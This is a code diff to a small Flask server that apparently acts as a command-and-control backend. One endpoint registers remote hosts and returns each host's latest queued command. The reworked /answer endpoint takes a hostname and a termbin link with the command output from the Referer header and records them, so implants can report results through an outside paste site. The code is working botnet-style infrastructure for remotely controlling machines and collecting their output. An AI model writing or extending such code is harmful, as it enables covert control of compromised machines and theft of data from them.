@@ -3,6 +3,7 @@
 from flask import Flask, request, render_template, jsonify
 from flask_cors import CORS
 
+import requests
 from hashlib import md5
 
 # custom sqlite db methods
@@ -146,7 +147,7 @@ def phase1():
 	host = (db.get_one_host(hostname)).get_json()
 
 	if host:
-		print("host already here")
+		print("[i] host already here")
 	else:
 		print("[!] no host %s registered !" % (hostname))
 		latest_id = insert_host(conn, hostname, ip)
@@ -158,15 +159,12 @@ def phase1():
 	# host_hash = md5((hostname+ip).encode('utf-8')).hexdigest()
 
 	latest_cmd_for_host = (db.get_last_cmd_for_host(hostname)).get_json()
-	
-	# return_txt = ""
 
-	# for cmd in latest_cmd_for_host:
-	# 	return_txt += cmd[0]+"\n"
+	if (len(latest_cmd_for_host) == 0):
+		return ''
 
-	# return "<RANDINT>--<HOSTNAME>--<CMD>"
 	return "123--%s--%s" % (hostname, latest_cmd_for_host[0][0])
-	# return "123--%s--%s" % (hostname, return_txt)
+
 # ===============================================
 
 
@@ -207,10 +205,24 @@ def api_commands_add():
 # endpoint pour recueillir les liens termbin 
 # avec la réponse de la commande précédemment exécutée
 # ===============================================
-@app.route("/answer", methods=['POST'])
+@app.route("/answer")
 def answer():
-	# params = request.get_json()
-	# success = db.api_add_command(params[0], params[1])
-	return "1"
+	# on recupere hostname + lien termbin via le header Referer
+	referrer = request.referrer
+
+	if referrer == None:
+		return ""
+
+	full_referrer = referrer.split(' -- ')
+
+	host = (full_referrer[0]).split(":")[1].split("-00")[0]
+	termbin_url = full_referrer[1]
+
+	# print("host : " + host)
+	# print("termbin_url : " + termbin_url)
+
+	success = db.api_add_answer(host, termbin_url)
+
+	return success
 # ===============================================
 
